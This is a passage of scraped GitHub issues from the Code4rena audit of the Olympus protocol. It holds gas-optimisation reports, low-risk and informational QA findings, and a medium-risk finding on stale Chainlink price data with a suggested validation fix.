"sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "## FINDINGS  NB: *Some functions have been truncated where neccessary to just show affected parts of the code* The gas estimates are the exact results from running the tests included with an exception of internal functions(we estimate based on number of SLOADS saved) The optimizer is set to run with the default runs(200). Throught the report some places might be denoted with audit tags to show the actual place affected.  ### Using immutable on variables that are only set in the constructor and never after  Use immutable if you want to assign a permanent value at construction. Use constants if you already know the permanent value. Both get directly embedded in bytecode, saving SLOAD. Variables only set in the constructor and never edited afterwards should be marked as immutable, as it would avoid the expensive storage-writing operation in the constructor (around 20 000 gas per variable) and replace the expensive storage-reading operations (around 2100 gas per reading) to a less expensive value reading (3 gas)  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/BondCallback.sol#L28 ```solidity File: /src/policies/BondCallback.sol 28:    IBondAggregator public aggregator;  ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/BondCallback.sol#L32 ```solidity File: /src/policies/BondCallback.sol 32:    ERC20 public ohm;  ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L48 ```solidity File: /src/policies/Heart.sol 48:    IOperator internal _operator; ```   ### The result of a function call should be cached rather than re-calling the function   https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L92-L109 ### Heart.sol.beat(): frequency() should be cached(Saves ~351 gas) ``` Average Gas Before: 29228       Average Gas After: 28871 ```  ```solidity File: /src/policies/Heart.sol 92:    function beat() external nonReentrant { 93:        if (!active) revert Heart_BeatStopped(); 94:        if (block.timestamp < lastBeat + frequency()) revert Heart_OutOfCycle(); //@audit: frequency()              ... 102:        // Update the last beat timestamp 103:        lastBeat += frequency(); //@audit: frequency()              ... 109:    } ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/PriceConfig.sol#L25-L35 ### PriceConfig.sol.requestPermissions():PRICE.KEYCODE() should be cached( Saves ~1472 gas) ``` Average Gas Before: 3956       Average Gas After: 2484 ```  ```solidity File: /src/policies/PriceConfig.sol 25:    function requestPermissions() 26:        external 27:        view 28:        override 29:        returns (Permissions[] memory permissions) 30:    { 31:        permissions = new Permissions[](3); 32:        permissions[0] = Permissions(PRICE.KEYCODE(), PRICE.initialize.selector); //@audit: PRICE.KEYCODE() 33:        permissions[1] = Permissions(PRICE.KEYCODE(), PRICE.changeMovingAverageDuration.selector); 34:        permissions[2] = Permissions(PRICE.KEYCODE(), PRICE.changeObservationFrequency.selector); 35:    } ```  **The above can be rewriten as follows:** ```solidity     function requestPermissions()external view override returns (Permissions[] memory permissions){        Keycode PRICE_KEYCODE = PRICE.KEYCODE();         permissions = new Permissions[](3);         permissions[0] = Permissions(PRICE_KEYCODE, PRICE.initialize.selector); //@audit: PRICE.KEYCODE()         permissions[1] = Permissions(PRICE_KEYCODE, PRICE.changeMovingAverageDuration.selector);         permissions[2] = Permissions(PRICE_KEYCODE, PRICE.changeObservationFrequency.selector);     } ```  **Other Instance:** https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/VoterRegistration.sol#L27-L36 ### VoterRegistration.sol.requestPermissions():VOTES.KEYCODE() should be cached( Saves ~758 gas) ``` Average Gas Before: 2863       Average Gas After: 2105 ```  ```solidity File: /src/policies/VoterRegistration.sol 27:    function requestPermissions() 28:        external 29:        view 30:        override 31:        returns (Permissions[] memory permissions) 32:    { 33:        permissions = new Permissions[](2); 34:        permissions[0] = Permissions(VOTES.KEYCODE(), VOTES.mintTo.selector); 35:        permissions[1] = Permissions(VOTES.KEYCODE(), VOTES.burnFrom.selector); 36:    } ```  See an existing implementation already on [Line 34](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/TreasuryCustodian.sol#L34-L40) for how to implement the above function ```solidity     function requestPermissions() external view override returns (Permissions[] memory requests) {         Keycode TRSRY_KEYCODE = TRSRY.KEYCODE();            requests = new Permissions[](2);         requests[0] = Permissions(TRSRY_KEYCODE, TRSRY.setApprovalFor.selector);         requests[1] = Permissions(TRSRY_KEYCODE, TRSRY.setDebt.selector);     } ```  ### Use calldata instead of memory for function parameters When a function with a memory array is called externally, the abi.decode() step has to use a for-loop to copy each index of the calldata to the memory index. Each iteration of this for-loop costs at least 60 gas (i.e. 60 * <mem_array>.length). Using calldata directly, obliviates the need for such a loop in the contract code and runtime execution.When arguments are read-only on external functions, the data location should be calldata:  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L205 ### PRICE.sol.initialize(): uint256\\[] memory startObservations_ should be uint256[] calldata startObservations_(Saves ~ 1933 gas) ``` Average Gas Before: 432495       Average Gas After: 430562 ```  ```solidity File: /src/modules/PRICE.sol     function initialize(uint256[] memory startObservations_, uint48 lastObservationTime_)         external         permissioned     {         if (initialized) revert Price_AlreadyInitialized();          // Cache numObservations to save gas.         uint256 numObs = observations.length;          // Check that the number of start observations matches the number expected         if (startObservations_.length != numObs || lastObservationTime_ > uint48(block.timestamp))             revert Price_InvalidParams();         // Push start observations into storage and total up observations         uint256 total;         for (uint256 i; i < numObs; ) {             if (startObservations_[i] == 0) revert Price_InvalidParams();             total += startObservations_[i];             observations[i] = startObservations_[i];             unchecked {                 ++i;             }         }         // Set moving average, last observation time, and initialized flag         _movingAverage = total / numObs;         lastObservationTime = lastObservationTime_;         initialized = true;     } ```  `startObservations_` should be declared calldata as it is readonly on this function  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/TreasuryCustodian.sol#L53-L67 ### TreasuryCustodian.sol.revokePolicyApprovals(): ERC20\\[] memory tokens_should be ERC20\\[] calldata tokens_(Saves ~ 114 gas) ``` Average Gas Before: 6956       Average Gas After: 6842 ```  ```solidity File: /src/policies/TreasuryCustodian.sol     function revokePolicyApprovals(address policy_, ERC20[] memory tokens_) external {         if (Policy(policy_).isActive()) revert PolicyStillActive();          // TODO Make sure `policy_` is an actual policy and not a random address.          uint256 len = tokens_.length;         for (uint256 j; j < len; ) {             TRSRY.setApprovalFor(policy_, tokens_[j], 0);             unchecked {                 ++j;             }         }          emit ApprovalRevoked(policy_, tokens_);     } ``` `ERC20[] memory tokens_` should be declared as `ERC20[] calldata tokens_` as it is readonly in this function  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/BondCallback.sol#L152-L166 ### BondCallback.sol.batchToTreasury(): ERC20\\[] memory tokens_should be ERC20\\[] calldata tokens_(Saves ~ 186 gas) ``` Average Gas Before: 12729       Average Gas After: 12543 ```  ```solidity File: /src/policies/BondCallback.sol     function batchToTreasury(ERC20[] memory tokens_) external onlyRole(\"callback_admin\") {         ERC20 token;         uint256 balance;         uint256 len = tokens_.length;         for (uint256 i; i < len; ) {             token = tokens_[i];             balance = token.balanceOf(address(this));             token.safeTransfer(address(TRSRY), balance);             priorBalances[token] = token.balanceOf(address(this));               unchecked {                 ++i;             }         }     } ``` `ERC20[] memory tokens_` should be declared as `ERC20[] calldata tokens_` as it is readonly in this function  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/PriceConfig.sol#L45-L50 ### PriceConfig.sol.initialize(): uint256[] memory startObservations_ should be uint256[] calldata startObservations_(Saves ~ 3580 gas) ``` Average Gas Before: 491657       Average Gas After: 488077 ```  ```solidity File: /src/policies/PriceConfig.sol 45:    function initialize(uint256[] memory startObservations_, uint48 lastObservationTime_) 46:        external 47:        onlyRole(\"price_admin\") 48:    { 49:        PRICE.initialize(startObservations_, lastObservationTime_); 50:    }  ``` `uint256[] memory startObservations_` should be declared as `uint256[] calldata startObservations_` as it is readonly in this function   https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L159-L163 ### Governance.sol.submitProposal(): string memory proposalURI_ should be string memory proposalURI_ (Saves ~ 3580 gas) ``` Average Gas Before: 491657       Average Gas After: 488077 ```  ```solidity File: /src/policies/Governance.sol 159:    function submitProposal( 160:        Instruction[] calldata instructions_, 161:        bytes32 title_, 162:        string memory proposalURI_ 163:    ) external {  ``` `string memory proposalURI_` should be declared as `string calldata proposalURI_` as it is readonly in this function  ### Caching storage values in memory to minimize SLOADs The code can be optimized by minimizing the number of SLOADs.  SLOADs are expensive (100 gas after the 1st one) compared to MLOADs/MSTOREs (3 gas each). Storage values read multiple times should instead be cached in memory the first time (costing 1 SLOAD) and then read from this cache to avoid multiple SLOADs.  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L122-L147 ### PRICE.sol.updateMovingAverage(): nextObsIndex should be cached(Saves ~123 gas) ``` Average Gas before:9124   Average Gas After: 9001 ``` The gas saved ends up being higher than the estimates if we optimize the functions that are also called inside this one **(~259 gas)** ```solidity File: /src/modules/PRICE.sol 122:    function updateMovingAverage() external permissioned {             ... 129:        // Get earliest observation in window 130:        uint256 earliestPrice = observations[nextObsIndex];             ... 141:        // Push new observation into storage and store timestamp taken at 142:        observations[nextObsIndex] = currentPrice; 143:        lastObservationTime = uint48(block.timestamp); 144:        nextObsIndex = (nextObsIndex + 1) % numObs;             ... 147:    } ```  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L154-L180 ### PRICE.sol.getCurrentPrice(): observationFrequency should be cached(Saves ~134 gas) ``` Average Gas before:5264   Average Gas After: 5130 ```  ```solidity File: /src/modules/PRICE.sol 154:    function getCurrentPrice() public view returns (uint256) { 155:        if (!initialized) revert Price_NotInitialized();                ... 165:            if (updatedAt < block.timestamp - 3 * uint256(observationFrequency)) 166:                revert Price_BadFeed(address(_ohmEthPriceFeed));                  ... 171:            if (updatedAt < block.timestamp - uint256(observationFrequency)) 172:                revert Price_BadFeed(address(_reserveEthPriceFeed));  ```   https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L122-L147 ### PRICE.sol.updateMovingAverage(): \\_movingAverage should be cached(Saves 1 sload ~ 99 gas ) ``` Average Gas before:9137   Average Gas After: 9038 ```  ```solidity File: /src/modules/PRICE.sol 122:    function updateMovingAverage() external permissioned {             ... 134:        // Calculate new moving average 135:        if (currentPrice > earliestPrice) { 136:            _movingAverage += (currentPrice - earliestPrice) / numObs;  //@audit: SLOAD 1 on happy path 137:        } else { 138:            _movingAverage -= (earliestPrice - currentPrice) / numObs;  //@audit: SLOAD 1 on sad path 139:        }             ... 146:        emit NewObservation(block.timestamp, currentPrice, _movingAverage);//@audit: SLOAD 2 147:    } ```   https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L183-L187 ### PRICE.sol.getLastPrice(): nextObsIndex should be cached(Saves 1 sload ~94 gas)  ```solidity File: /src/modules/PRICE.sol 183:    function getLastPrice() external view returns (uint256) { 184:        if (!initialized) revert Price_NotInitialized(); 185:        uint32 lastIndex = nextObsIndex == 0 ? numObservations - 1 : nextObsIndex - 1; 186:        return observations[lastIndex]; 187:    }  ```  ### PRICE.sol.changeMovingAverageDuration(): observationFrequency should be cached(Saves 1 sload) https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L240-L246 ```solidity File: /src/modules/PRICE.sol 240:    function changeMovingAverageDuration(uint48 movingAverageDuration_) external permissioned { 241:       // Moving Average Duration should be divisible by Observation Frequency to get a whole number of observations 242:        if (movingAverageDuration_ == 0 || movingAverageDuration_ % observationFrequency != 0) //@audit: SLOAD 1 243:            revert Price_InvalidParams();             ... 245:        // Calculate the new number of observations 246:        uint256 newObservations = uint256(movingAverageDuration_ / observationFrequency); //@audit: SLOAD 2 ```   ### PRICE.sol.changeObservationFrequency(): movingAverageDuration should be cached(Saves 1 sload) https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L266-L272 ```solidity File: /src/modules/PRICE.sol 266:    function changeObservationFrequency(uint48 observationFrequency_) external permissioned { 267:       // Moving Average Duration should be divisible by Observation Frequency to get a whole number of observations 268:        if (observationFrequency_ == 0 || movingAverageDuration % observationFrequency_ != 0) //@audit: SLOAD 1 269:            revert Price_InvalidParams();             ... 271:        // Calculate the new number of observations 272:        uint256 newObservations = uint256(movingAverageDuration / observationFrequency_); //@audit: SLOAD 2 ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L92-L109 ### Heart.sol.beat(): lastBeat should be cached(Saves 1 sload ~40gas , saves ~399 if we cache the result of the external call `frequency()` )  ``` Estimations without caching the frequency function: only cache lastBeat           Average Gas before:29228   Average Gas After: 29188  Estimations after caching the frequency function: lastBeat and frequency           Average Gas before:29228   Average Gas After: 28829 ```  ```solidity File: /src/policies/Heart.sol 92:    function beat() external nonReentrant { 93:        if (!active) revert Heart_BeatStopped(); 94:        if (block.timestamp < lastBeat + frequency()) revert Heart_OutOfCycle(); //@audit: lastBeat SLOAD 1             ... 102:        // Update the last beat timestamp 103:        lastBeat += frequency(); //@audit: lastBeat SLOAD 2             ... 109:    } ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L111-L114 ### Heart.sol.\\_issueReward(): reward should be cached(Saves 1 sload ~94 gas)  ```solidity File: /src/policies/Heart.sol 111:    function _issueReward(address to_) internal { 112:        rewardToken.safeTransfer(to_, reward); //@audit: reward SLOAD 1 113:        emit RewardIssued(to_, reward); //@audit: reward SLOAD 2 114:    } ```  ### Other interesting places that we can utilize caching. https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L240-L262 ### Governance.sol.vote(): activeProposal.proposalId should be cached(Saves ~281 gas) ``` Average Gas Before: 61568       Average Gas After: 61287 ```  ```solidity File: /src/policies/Governance.sol 240:    function vote(bool for_) external {             ... 243:        if (activeProposal.proposalId == 0) { //@audit: activeProposal.proposalId 244:            revert NoActiveProposalDetected(); 245:        }             ... 247:        if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) { //@audit: activeProposal.proposalId 248:            revert UserAlreadyVoted(); 249:        }             ... 251:        if (for_) { 252:            yesVotesForProposal[activeProposal.proposalId] += userVotes; //@audit: activeProposal.proposalId 253:        } else { 254:            noVotesForProposal[activeProposal.proposalId] += userVotes; //@audit: activeProposal.proposalId 255:        }           ... 257:        userVotesForProposal[activeProposal.proposalId][msg.sender] = userVotes; //@audit: activeProposal.proposalId             ... 261:        emit WalletVoted(activeProposal.proposalId, msg.sender, for_, userVotes);//@audit: activeProposal.proposalId 262:    } ```  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L265-L289 ### Governance.sol.executeProposal(): activeProposal.proposalId should be cached(Saves ~147gas) ``` Average Gas Before: 171376       Average Gas After: 171229 ```  ```solidity File: /src/policies/Governance.sol 265:    function executeProposal() external { 266:        uint256 netVotes = yesVotesForProposal[activeProposal.proposalId] - 267:            noVotesForProposal[activeProposal.proposalId];             ...     276:        Instruction[] memory instructions = INSTR.getInstructions(activeProposal.proposalId);             ... 285:        emit ProposalExecuted(activeProposal.proposalId);             ... 289:    } ```  ## Internal/Private functions only called once can be inlined to save gas  Not inlining costs 20 to 40 gas because of two extra JUMP instructions and additional stack operations needed for function calls.  Affected code:  https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L  ```solidity File: /src/Kernel.sol 279:    function _upgradeModule(Module newModule_) internal {  295:    function _activatePolicy(Policy policy_) internal {  325:    function _deactivatePolicy(Policy policy_) internal {  351:    function _migrateKernel(Kernel newKernel_) internal {  409:    function _pruneFromDependents(Policy policy_) internal {  ```  https://gi"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/444", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "## LOW RISK  ### 1) `lastBeat` might lag  The variable `lastBeat` is used to store the [timestamp of the last beat](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L35), yet it is incremented only by [`frequency()`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L103). While this would work perfectly in the scenario that keeper bots are consistently calling this function with a frequency of `frequency()` for rewards, `lastBeat` may start lagging behind the actual time in the case there are some update made to the `PRICE` contract (updating observation frequency or the moving average duration) and thus `PRICE` contract is back in the `initialized == false` state which would result in [the call to `updateMovingAverage()` failing](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L97) as the function would revert when `PRICE` is not in the initialized state. This scenario would result in any calls made to the `beat` reverting, and if the `PRICE` contract is not initialized immediately (so there is some delay) after the updates, `lastBeat` would lag behind as it would start getting incremented from the old value up to  old value + multiples of `frequency()`, never reaching the actual timestamp of `beat`s. This can be solved with by making a call to `resetBeat` or by making sure the updates and initializations are done in an atomic fashion operationally, and thus we think this creates only a low risk.      ## NON-CRITICAL ### Open TODOs There are three open TODOs in this function, and according to our understanding, this function `revokePolicyApprovals` does not require a check to see if the address supplied is a deactivated policy, as `TRSRY` should be only called by policies, and thus only policies would require approvals and revoking the approval of something that is not a policy would not do anything. So, these TODOs can be removed. (https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/TreasuryCustodian.sol#L56)  ### TYPO There is a typo in this line (https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L126), `numbe` should be `number`."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/443", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "edited-by-warden"], "target": "2022-08-olympus-findings", "body": "1 Use != 0 instead of > 0 at the above mentioned codes. The variable is uint, so it will not be below 0 so it can just check != 0. != 0 costs less gas compared to > 0 for unsigned integers in require statements with the optimizer enabled https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L247  2   ++I COSTS LESS GAS COMPARED TO I++  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L670 https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L686 3 <ARRAY>.LENGTH SHOULD NOT BE LOOKED UP IN EVERY LOOP OF A FOR-LOOP and Increments can be unchecked The overheads outlined below are PER LOOP, excluding the first loop storage arrays incur a Gwarmaccess (100 gas) memory arrays use MLOAD (3 gas) calldata arrays use CALLDATALOAD (3 gas) Caching the length changes each of these to a DUP<N> (3 gas), and gets rid of the extra DUP<N> needed to store the stack offset  https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L278"}, {"title": "[NAZ-M1] Chainlink's `latestRoundData` Might Return Stale Results", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/441", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L161 https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L170   # Vulnerability details  ## Impact Across these contracts, you are using Chainlink's `latestRoundData` API, but there is only a check on `updatedAt`. This could lead to stale prices according to the Chainlink documentation:  * [Historical Price data](https://docs.chain.link/docs/historical-price-data/#historical-rounds) * [Checking Your returned answers](https://docs.chain.link/docs/faq/#how-can-i-check-if-the-answer-to-a-round-is-being-carried-over-from-a-previous-round)  The result of `latestRoundData` API will be used across various functions, therefore, a stale price from Chainlink can lead to loss of funds to end-users.  ## Tools Used Manual Review  ## Recommended Mitigation Steps Consider adding the missing checks for stale data.  For example: ```js (uint80 roundID ,answer,, uint256 timestamp, uint80 answeredInRound) = AggregatorV3Interface(chainLinkAggregatorMap[underlying]).latestRoundData();  require(answer > 0, \"Chainlink price <= 0\");  require(answeredInRound >= roundID, \"Stale price\"); require(timestamp != 0, \"Round not complete\"); ```"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/440", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "## [NAZ-L1] Missing Time locks **Severity**: Low  **Context**: [`RANGE.sol#L263`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L263), [`PRICE.sol#L240`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L240), [`PRICE.sol#L266`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L266), [`Operator.sol#L516`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L516), [`Operator.sol#L527`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L527), [`Operator.sol#L548`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L548), [`Operator.sol#L559`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L559), [`Operator.sol#L586`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L586), [`Heart.sol#L130`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L130), [`Heart.sol#L135`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L135), [`Heart.sol#L140`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L140)  **Description**: When critical parameters of systems need to be changed, it is required to broadcast the change via event emission and recommended to enforce the changes after a time-delay. This is to allow system users to be aware of such critical changes and give them an opportunity to exit or adjust their engagement with the system accordingly. None of the onlyOwner functions that change critical protocol addresses/parameters have a timelock for a time-delayed change to alert: (1) users and give them a chance to engage/exit protocol if they are not agreeable to the changes (2) team in case of compromised owner(s) and give them a chance to perform incident response.  **Recommendation**: Users may be surprised when critical parameters are changed. Furthermore, it can erode users' trust since they can\u2019t be sure the protocol rules won\u2019t be changed later on. Compromised owner keys may be used to change protocol addresses/parameters to benefit attackers. Without a time-delay, authorized owners have no time for any planned incident response.   ## [NAZ-L2] Missing Equivalence Checks in Setters **Severity**: Low **Context**: [`Kernel.sol#L77`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L77), [`Kernel.sol#L127`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L127), [`Kernel.sol#L251`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L251), [`Kernel.sol#L253`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L253), [`TRSRY.sol#L122`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L122), [`RANGE.sol#L242`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L242), [`RANGE.sol#L263`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L263), [`PRICE.sol#L240`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L240), [`PRICE.sol#L266`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L266), [`Operator.sol#L516`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L516), [`Operator.sol#L527`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L527), [`Operator.sol#L548`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L548), [`Operator.sol#L559`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L559), [`Operator.sol#L586`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L586), [`BondCallback.sol#L190`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L190), [`Heart.sol#L130`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L130), [`Heart.sol#L135`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L135), [`Heart.sol#L140`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L140)  **Description**: Setter functions are missing checks to validate if the new value being set is the same as the current value already set in the contract. Such checks will showcase mismatches between on-chain and off-chain states.  **Recommendation**: This may hinder detecting discrepancies between on-chain and off-chain states leading to flawed assumptions of on-chain state and protocol behavior.   ## [NAZ-L3] Missing Zero-address Validation **Severity**: Low **Context**: [`Kernel.sol#L77`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L77), [`Kernel.sol#L251`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L251), [`Kernel.sol#L253`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L253), [`BondCallback.sol#L190`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L190), [`Heart.sol#L140`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L140)  **Description**: Lack of zero-address validation on address parameters may lead to transaction reverts, waste gas, require resubmission of transactions and may even force contract redeployments in certain cases within the protocol.  **Recommendation**: Consider adding explicit zero-address validation on input parameters of address type.   ## [NAZ-L4] Lack of Event Emission For Critical Functions **Severity**: Low **Context**: [`Kernel.sol#L77`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L77), [`Kernel.sol#L127`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L127), [`Kernel.sol#L251`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L251), [`Kernel.sol#L253`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L253), [`BondCallback.sol#L190`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L190), [`Heart.sol#L130`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L130), [`Heart.sol#L135`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L135)  **Description**: Several functions update critical parameters that are missing event emission. These should be performed to ensure tracking of changes of such critical parameters.  **Recommendation**: Consider adding events to functions that change critical parameters.   ## [NAZ-L5] Missing Events In Initialize Functions **Severity**: Low **Context**: [`PRICE.sol#L205`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L205), [`Operator.sol#L598`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L598), [`PriceConfig.sol#L45`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/PriceConfig.sol#L45)  **Description**: None of the initialize functions emit emit init-specific events. They all however have the initializer modifier (from Initializable) so that they can be called only once. Off-chain monitoring of calls to these critical functions is not possible.  **Recommendation**: It is recommended to emit events in your initialization functions.   ## [NAZ-N1] Unreachable Code **Severity** Informational **Context**: [`VOTES#L47`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L47)  **Description**: There is unreachable code that can be removed to clean up the code.  **Recommendation**: Consider removing the unreachable code to clean it up.    ## [NAZ-N2] Votes Module `ERC20` Token Name `\"OlympusDAO Dummy Voting Tokens\"` **Severity** Informational **Context**: [`VOTES#L18`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L18)  **Description**: This was probably meant as a joke during testing and should probably be renamed for production to not confuse users.  **Recommendation**: Consider renaming the votes module `ERC20` token name `\"OlympusDAO Dummy Voting Tokens\"` to `\"OlympusDAO Voting Tokens\"`.   ## [NAZ-N3] Function && Variable Naming Convention **Severity** Informational **Context**: [`Kernel.sol#L131`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L131), [`PRICE.sol#L59`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L59), [`TreasuryCustodian.sol#L20`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/TreasuryCustodian.sol#L20), [`Operator.sol#L69-L72`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L69-L72), [`Heart.sol#L45`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Heart.sol#L45), [`PriceConfig.sol#L11`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/PriceConfig.sol#L11)  **Description**: The linked variables do not conform to the standard naming convention of Solidity whereby functions and variable names(local and state) utilize the `mixedCase` format unless variables are declared as `constant` in which case they utilize the `UPPER_CASE_WITH_UNDERSCORES` format. Internal/private functions and variables should lead with an `_underscore`.  **Recommendation**: Consider naming conventions utilized by the linked statements are adjusted to reflect the correct type of declaration according to the Solidity style guide.   ## [NAZ-N4] Code Structure Deviates From Best-Practice **Severity**: Informational **Context**: [`Kernel.sol#L71`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L71), [`Kernel.sol#L89`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L89), [`Kernel.sol#L120`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L120), [`Kernel.sol#L224-L230`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L224-L230), [`TRSRY.sol#L20-L39`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L20-L39), 